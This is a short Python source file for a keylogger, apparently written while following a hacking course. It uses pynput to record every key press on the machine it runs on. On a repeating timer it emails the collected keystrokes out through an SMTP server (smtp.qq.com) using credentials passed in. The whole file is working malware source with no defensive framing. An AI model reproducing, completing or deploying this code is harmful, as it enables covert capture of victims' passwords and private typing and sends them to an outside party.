#!/usr/bin/env python

# killall python

import pynput.keyboard
import threading
import smtplib

# using global variable --> + global [name]
# log = ""

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started\n"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        # call back func
        try:
            current_key = str(key.char)
        except AttributeError:
            # space, down, up do not have .char
            if key == key.space:
                current_key = " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        # \n\n: log --> message instead of header
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        # recursion every [interval] sec
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # google: smtp.gmail.com, port 587
        server = smtplib.SMTP_SSL("smtp.qq.com", 465)
        server.login(email, password)
        server.sendmail(from_addr=email, to_addrs=email, msg=message.encode("gb2312"))
        server.quit()
        print("[+] Mail sent.")
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

